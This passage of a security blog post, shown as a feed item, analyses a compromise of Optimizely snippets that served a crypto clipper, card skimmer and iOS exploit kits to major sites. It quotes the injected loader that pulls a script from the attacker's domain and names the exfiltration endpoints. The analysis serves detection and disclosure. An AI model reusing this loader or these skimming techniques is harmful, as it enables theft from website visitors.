            <title><![CDATA[Optimizely Compromised, Served Malware on Zoom, GitLab (304 pts)]]></title>
            <link>https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/</link>
            <guid>50524767</guid>
            <pubDate>Mon, 16 Nov 2026 23:00:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/">https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/</a>, See on <a href="https://news.ycombinator.com/item?id=50524767">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

    <article>

        <header>

            

                <ul>
                        <li><a href="https://blog.report-uri.com/tag/magecart/">Magecart</a></li>
                        <li><a href="https://blog.report-uri.com/tag/darksword/">DarkSword</a></li>
                        <li><a href="https://blog.report-uri.com/tag/coruna/">Coruna</a></li>
                        <li><a href="https://blog.report-uri.com/tag/malware/">Malware</a></li>
                        <li><a href="https://blog.report-uri.com/tag/csp-integrity/">CSP Integrity</a></li>
                        <li><a href="https://blog.report-uri.com/tag/js-time-machine/">JS Time Machine</a></li>
                        <li><a href="https://blog.report-uri.com/tag/javascript-integrity-monitoring/">JavaScript Integrity Monitoring</a></li>
                        <li><a href="https://blog.report-uri.com/tag/script-vault/">Script Vault</a></li>
                        <li><a href="https://blog.report-uri.com/tag/script-watch/">Script Watch</a></li>
                </ul>

            <div>
                <p><a href="https://blog.report-uri.com/author/scott/">
                                <img src="https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w160/2026/02/profile-pic-small.png" alt="Scott Helme">
                            </a>
                </p>
                <div>
                    
                    <p><time datetime="2026-11-16">16 Nov 2026</time>
                            <span><span>—</span> 14 min read</span>
                    </p>
                </div>
            </div>

                <figure>
        <img srcset="https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w320/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 320w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w600/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 600w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w960/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 960w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w1200/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 1200w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w2000/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 2000w" sizes="(max-width: 1200px) 100vw, 1120px" src="https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w1200/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png" alt="World's Largest Brands Infected With Malware Via Optimizely">
    </figure>

        </header>

        <section>
            <p>On 16 November 2026, malicious JavaScript was served to visitors of <strong>178 organisations</strong> through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: <strong>Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock</strong>.</p><p>The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the <strong>Coruna and DarkSword iOS exploit kits</strong>. Crypto has already been stolen, with verified transactions to the attackers.</p><p><strong>This is exactly the kind of attack Report URI is designed to detect.</strong> Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.</p><p>The important lesson here is that <strong>trusted JavaScript doesn't always remain trustworthy</strong>. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.</p><p>Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.</p><h2 id="what-happened">What happened</h2><p>Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example <code>https://cdn.optimizely.com/js/6395285578973184.js</code>. The snippet contains Optimizely's code, the customer's experiments and an optional field called <strong>Project JavaScript</strong> (<code>projectJS</code>): custom code the customer writes in their Optimizely dashboard, which runs on every page.</p><p>The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from <code>cdn.optimizely.com</code>, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:</p><pre><code>"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();</code></pre><p>We saw three versions of the injected loader:</p><ol><li><strong>A plain <code>&lt;script&gt;</code> tag</strong> pointing at <code>https://1688360.cc/track.js</code> (most snippets).</li><li><strong>The same URL hidden in base64</strong> with <code>atob()</code>. A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.</li><li><strong>A full inline copy of the payload</strong>, which runs through <code>eval</code> if <code>1688360.cc</code> is blocked.</li></ol><p>Some customers serve their snippet from their own domain, such as <code>opt.scheels.com/js/&lt;id&gt;.js</code> or <code>www.vodafone.com.au/js/&lt;id&gt;.js</code>. Those were affected too, because the content comes from the same Optimizely project.</p><p><strong>We don't know how the attacker got write access</strong> to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for <code>www.optimizely.com</code> and <code>login.optimizely.com</code> both carried the code.</p><h2 id="timeline-utc">Timeline (UTC)</h2><table>
<thead>
<tr>
<th>Time</th>
<th>Event</th>
</tr>
</thead>
<tbody>
<tr>
<td>Sep 17</td>
<td><code>webshell.lol</code>, the same actor's injector, first appears on Turkish sites through an SEO "backlink panel" script</td>
</tr>
<tr>
<td>Nov 09 17:52</td>
<td><code>5vobauua3ojpklx.icu</code> registered (iOS exploit-kit router)</td>
</tr>
<tr>
<td>Nov 13 to 11-16</td>
<td><strong>Earlier wave:</strong> <code>webshell.lol/get.js</code> injected through <strong>Kissmetrics</strong>, <strong>StorifyMe</strong> and <strong>Minute Media</strong> scripts on sites including securitybank.com, faz.net, smh.com.au, vidaxl and foxsports.com</td>
</tr>
<tr>
<td>Nov 16 02:21</td>
<td>Last clean urlscan capture of the BBC's Optimizely snippet</td>
</tr>
<tr>
<td><strong>Nov 16 04:21</strong></td>
<td><strong>First Optimizely injection seen</strong> (BBC snippet loading <code>webshell.lol</code>)</td>
</tr>
<tr>
<td>04:28 to 05:23</td>
<td><code>1688360.cc</code> certificates issued; domain registered at 05:23</td>
</tr>
<tr>
<td>08:10</td>
<td>First build of <code>track.js</code> (crypto clipper)</td>
</tr>
<tr>
<td>08:28</td>
<td><code>1688360.cc/track.js</code> first seen on bbc.com</td>
</tr>
<tr>
<td>11:20</td>
<td>Zoom's snippet modified (its <code>Last-Modified</code> header)</td>
</tr>
<tr>
<td>13:03</td>
<td>Attacker sweeps stolen crypto to exchanges</td>
</tr>
<tr>
<td>13:43</td>
<td>Card skimmer added to <code>track.js</code></td>
</tr>
<tr>
<td>16:38</td>
<td><code>eil786npto9u5bq.icu</code> registered (second iOS router)</td>
</tr>
<tr>
<td>17:13 to 17:57</td>
<td>Second iOS host added; Coruna iframe injected into every iOS 18.6-or-earlier visit</td>
</tr>
<tr>
<td>19:24 to 19:59</td>
<td>Our sweep: <strong>186 of 1,611</strong> Optimizely snippets infected</td>
</tr>
<tr>
<td>~20:40 to 21:10</td>
<td>Mass clean-up (Ledger 20:41, Smartsheet 20:56, BBC 21:07)</td>
</tr>
<tr>
<td>21:52</td>
<td>1 of 188 snippets still infected (TalkTalk)</td>
</tr>
</tbody>
</table>
<p>The payload was rebuilt <strong>26 times</strong> during the day. The attacker added features, and added wallets but never removed any.</p><h2 id="what-the-payload-does">What the payload does</h2><p>Every visitor received the same script, <code>track.js</code>, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.</p><h3 id="1-crypto-address-swapping-already-stealing-money">1. Crypto address swapping (already stealing money)</h3><p>The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:</p><ul><li>page text, form fields, links and images;</li><li>the clipboard, on copy and through <code>navigator.clipboard</code>;</li><li>outgoing <code>fetch</code>/XHR requests, <code>window.open</code>, navigation and the iOS share sheet.</li></ul><p>It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.</p><h3 id="2-card-skimming">2. Card skimming</h3><p>Added at 13:43 UTC. The script watches form submissions and every <code>fetch</code>/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to <code>https://1688360.cc/card.php</code> with <code>navigator.sendBeacon</code>. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.</p><h3 id="3-cookie-and-screenshot-theft">3. Cookie and screenshot theft</h3><p>When it swaps an address next to wallet or payment wording, it sends the following to <code>https://1688360.cc/hit.php</code>:</p><ul><li>the page URL;</li><li><code>document.cookie</code> (cookies not marked <code>HttpOnly</code>);</li><li>the original addresses it replaced;</li><li>a screenshot of the page, rendered with html2canvas.</li></ul><h3 id="4-ios-exploit-kits-coruna-and-darksword">4. iOS exploit kits: Coruna and DarkSword</h3><p>On iPhones and iPads the script loads <code>boot.js</code> from <code>5vobauua3ojpklx.icu</code> and <code>eil786npto9u5bq.icu</code>. It reads the iOS version and loads an exploit chain in a hidden iframe:</p><table>
<thead>
<tr>
<th>iOS version</th>
<th>Chain</th>
</tr>
</thead>
<tbody>
<tr>
<td>13 to 17</td>
<td><strong>Coruna</strong> (<code>/A8/</code>, plus a direct Coruna loader at <code>/JIUJIU888/index.js</code>)</td>
</tr>
<tr>
<td>18.x</td>
<td><strong>DarkSword</strong> (<code>/B9/</code>, <code>/D11/</code>, <code>/D12/</code>)</td>
</tr>
<tr>
<td>26</td>
<td>Separate chain (<code>/C10/</code>); currently only fingerprints the device</td>
</tr>
</tbody>
</table>
<p>The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.</p><figure><img src="https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/2026/11/Screenshot-2026-11-16-214353.png" alt="" loading="lazy" width="1706" height="1108" srcset="https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w600/2026/11/Screenshot-2026-11-16-214353.png 600w, https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w1000/2026/11/Screenshot-2026-11-16-214353.png 1000w, https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w1600/2026/11/Screenshot-2026-11-16-214353.png 1600w, https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/2026/11/Screenshot-2026-11-16-214353.png 1706w" sizes="(min-width: 720px) 720px"></figure><h2 id="money-stolen-so-far">Money stolen so far</h2><p>As of 19:25 UTC on 16 November, the attacker's wallets had received about <strong>$7,040</strong>, all within roughly nine hours on the 16th:</p><table>
